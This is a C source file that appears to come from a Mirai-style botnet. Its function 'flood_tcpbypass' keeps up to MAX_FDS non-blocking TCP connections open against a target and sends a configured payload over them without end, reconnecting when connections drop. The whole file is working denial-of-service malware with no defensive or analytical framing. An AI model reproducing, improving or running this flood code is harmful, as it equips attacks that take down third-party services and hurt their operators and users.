#define _GNU_SOURCE

#include "../../../../utils/headers/includes.h"
#include "../../../../utils/headers/util.h"
#include "../../../../utils/headers/resolver.h"
#include "../../../../utils/headers/rand.h"
#include "../../attack.h"


void flood_tcpbypass(struct flood *connection)
{
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(connection->settings->dest_port);
    addr.sin_addr.s_addr = connection->targets[0].addr;

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    int clear = 0;

    for (int i = 0; i < MAX_FDS; i++)
    {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }

    while (TRUE)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        socklen_t err = 0;
        int err_len = sizeof(int);

        for (i = 0; i < MAX_FDS; i++)
        {
            switch (states[i].state)
            {
            case 0:
                if ((states[i].fd = sys_socket(AF_INET, SOCK_STREAM, 0)) == -1)
                {
                    continue;
                }
                sys_fcntl(states[i].fd, F_SETFL, O_NONBLOCK | sys_fcntl(states[i].fd, F_GETFL, 0));

                errno = 0;
                if (sys_connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                {
                    sys_close(states[i].fd);
                    states[i].timeout = 0;
                    continue;
                }
                states[i].state = 1;
                states[i].timeout = sys_time(NULL);
                break;
            case 1:
                FD_ZERO(&write_set);
                FD_SET(states[i].fd, &write_set);

                timeout.tv_usec = 10;
                timeout.tv_sec = 0;

                fds = sys_select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                if (fds == 1)
                {
                    sys_getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

                    if (err)
                    {
                        sys_close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                        continue;
                    }

                    states[i].state = 2;
                    continue;
                }
                else if (fds == -1)
                {
                    sys_close(states[i].fd);
                    states[i].state = 0;
                    states[i].timeout = 0;
                }

                if (states[i].timeout + 5 < sys_time(NULL))
                {
                    sys_close(states[i].fd);
                    states[i].state = 0;
                    states[i].timeout = 0;
                }
                break;
            case 2:
                // The payload should be pre-initialized by the bot engine.
                if (connection->settings->payload == NULL) break;

                // Use a local copy of the target to avoid race conditions on shared memory
                struct flood_target target = connection->targets[0];
                if (target.netmask < 32)
                    target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

                if (sys_sendto(states[i].fd, connection->settings->payload, connection->settings->length, MSG_NOSIGNAL, NULL, 0) == -1 && errno != EAGAIN) // Finished send
                {
                    sys_close(states[i].fd);
                    states[i].state = 0;
                    states[i].timeout = 0;
                }

                break;
            }
            if (connection->settings->sleep > 0)
                sys_usleep(connection->settings->sleep * 1000);
        }
    }
}
